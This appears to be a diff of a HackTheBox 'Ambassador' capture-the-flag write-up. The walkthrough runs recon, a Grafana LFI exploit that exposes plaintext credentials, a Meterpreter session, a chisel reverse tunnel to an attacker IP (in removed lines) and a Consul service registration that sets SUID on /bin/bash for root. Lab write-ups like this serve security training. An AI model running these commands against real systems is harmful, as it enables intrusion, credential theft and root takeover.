@@ -4,6 +4,8 @@
 
 ### Vulnerabilities: Grafana LFI, MySQL creds, Consul ACL token
 
+Nmap shows us the way with ports 22, 80, and 3000 open.
+
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.51.253
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 13:39 CDT
@@ -127,7 +129,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
 ```
 
-Run a quick feroxbuster before we visit the site.
+Run a quick feroxbuster before we visit the site, but we did not find anything helpful.
 
 ```
 └─$ feroxbuster -u http://10.129.51.253/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q 
@@ -252,10 +254,12 @@ WLD         -         -         - http://10.129.51.253:3000/3ca9506f5a03461685b7
 
 Accessing the site gave back a login screen, I attempted login bypass with sql injection but had no luck.
 
+Note: I noticed in burpsuite that there was also a redirect field that seems interesting but I never ended up doing anything with it.
+
 ![image](https://user-images.githubusercontent.com/105310322/193699522-4de4729e-b5b5-4eb3-9ffd-d62293f07f64.png)
 
 
-Instead there was a simple exlpoit for grafana that allowed you to read files. Which is really just an LFI. TO mkae sure it is vulnerable we can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
+Instead there was a simple exlpoit for grafana that allowed you to read files. Which is really just an LFI. TO make sure it is vulnerable we can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
 
 https://www.exploit-db.com/exploits/50581
 
@@ -313,7 +317,7 @@ These 2 files that are mentioned in the exploit are super important. They have c
 /var/lib/grafana/grafana.db
 /etc/grafana/grafana.ini
 ```
-By lookoing in grafan.ini we find the following creds.
+By looking in grafan.ini we find the following creds.
 
 ```
 admin
@@ -338,7 +342,7 @@ So I tried the manual version of the LFI and pulled the file straight from the s
 Doing so we can find the creds under data-source!
 
 ```
-Grafana
+grafana
 dontStandSoCloseToMe63221!
 ```
 
@@ -371,7 +375,7 @@ My grepped line.
 
 ```INSERT INTO `users` VALUES ('developer','YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==');```
 
-The full creds for decoded.
+The full creds decoded.
 
 ```
 developer
@@ -411,9 +415,9 @@ developer@ambassador:~$ cat user.txt
 6c698***************************
 ```
 
-From pspy it shows root is running consul.
+From pspy it shows root is running consul. I Had never dealt with consul but I had a good feeling about it so this was the first thing I checked into.
 
-```
+```console
 2022/10/04 16:24:54 CMD: UID=0    PID=1063   | /usr/sbin/apache2 -k start 
 2022/10/04 16:24:54 CMD: UID=0    PID=1060   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
 2022/10/04 16:24:54 CMD: UID=0    PID=106    | 
@@ -437,7 +441,7 @@ From pspy it shows root is running consul.
 
 Linpeas also tells us that there are a couple of other services running on open ports.
 
-```
+```console
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
@@ -456,13 +460,14 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 
 By using curl we can confirm that consul is being ran on port 8500.
 
-```
+```console
 developer@ambassador:/tmp$ curl http://127.0.0.1:8500
 Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.
 ```
 As developer we can run consul and check the version so we can find an exploit.
 
-```
+
+```console
 developer@ambassador:/tmp$ consul --version
 Consul v1.13.2
 Revision 0e046bbb
@@ -470,19 +475,9 @@ Build Date 2022-09-20T20:30:07Z
 Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)
 ```
 
-```
-└──╼ [★]$ chisel server --reverse --port 1235
-2022/10/04 17:41:49 server: Reverse tunnelling enabled
-2022/10/04 17:41:49 server: Fingerprint tVqvYjj0bVDgalAncKCfbyHOT/3CAWGABoc06Fv/dcc=
-2022/10/04 17:41:49 server: Listening on http://0.0.0.0:1235
-2022/10/04 18:01:46 server: session#1: tun: proxy#R:8500=>8500: Listening
-```
-```
-developer@ambassador:/tmp$ ./chisellinuxamd64 client 10.10.14.63:1235 R:8500:127.0.0.1:8500
-2022/10/04 17:01:34 client: Connecting to ws://10.10.14.63:1235
-2022/10/04 17:01:34 client: Connected (Latency 3.369374ms)
-```
-Linpeas also tells us that there is a .git file. From doing other Machines on HTB everytime there has been a .git I have found good info to use.
+Linpeas also tells us that there is a .git file. From doing other Machines on HTB everytime there has been a .git I have found good info in the directory to use.
+
+So lets transfer the files from the victim to our host computer and see what we can find.
 
 ```
 /opt/my-app/.git
@@ -490,7 +485,7 @@ Linpeas also tells us that there is a .git file. From doing other Machines on HT
 
 We have a couple of files we can check out.
 
-```
+```console
 └──╼ [★]$ git ls-files --stage
 100644 681ceb58607bb4d9e8fc96951ef7cd44e1f7f2cc 0	.gitignore
 100755 d2c40f436012196a0a36a6467e9a67efc9c9dd74 0	whackywidget/manage.py
@@ -504,7 +499,7 @@ We have a couple of files we can check out.
 
 Git log shows some changes took place.
 
-```
+```console
 └──╼ [★]$ git log
 commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
 Author: Developer <developer@ambassador.local>
@@ -535,7 +530,9 @@ Date:   Sun Mar 13 22:44:11 2022 +0000
 
 If we check out the commit with config script it reveals a command used with consul and a token!
 
-```
+With this token we can finally do our exploit.
+
+```console
 └──╼ [★]$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
 commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
 Author: Developer <developer@ambassador.local>
@@ -557,7 +554,7 @@ index 0000000..35c08f6
 
 I thought it was interesting that there was a secret key found in this one but I did not find anything to do with it so it was likely a rabbit hole.
 
-```
+```console
 └──╼ [★]$ git show 79406a8e4d6229e1950f76e5147e0feacf452f8e
 """
 Django settings for whackywidget project.
@@ -651,15 +648,22 @@ Exploit target:
 [*] Meterpreter session 1 opened (10.10.14.63:1234 -> 10.129.52.79:47984) at 2022-10-04 20:15:48 +0100
 [*] Removing service 'CkgOb'
 [*] Command Stager progress - 100.00% done (763/763 bytes)
+```
+BOOM! Metasploit is an easy way to go but for the sake of learning and training for OSCP I try to refrain from using it.
 
+```console
 (Meterpreter 1)(/) > cat /root/root.txt
 18bf****************************
 
 ```
 
+Thats why we have a manual version to learn from!
+
 For the manual version the link below gives info and scripts to make the exploit happen.
 
 https://www.consul.io/docs/discovery/checks
+
+Note: It is possible to exploit this through curl but I was unable to make it work.
 
 Edit the script slightly to chmod bash to have a suid bit.
 
@@ -686,14 +690,11 @@ Note: Consul documentation will help you out the most for learning how to use th
 ```console
 developer@ambassador:~$ consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
 developer@ambassador:~$ consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/exploit.hcl
-developer@ambassador:~$ ls -la /bin/bash
--rwxr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash
 developer@ambassador:~$ consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
 Configuration reload triggered
 ```
-After running these commands /bin/bash should have the suid bit set and you can run commands as root!
 
-Note: There was some inconsistency doing this. Had to run it multiple times until it eventually worked.
+After running these commands /bin/bash should have the suid bit set and you can run commands as root!
 
 ```console
 developer@ambassador:~$ bash -p
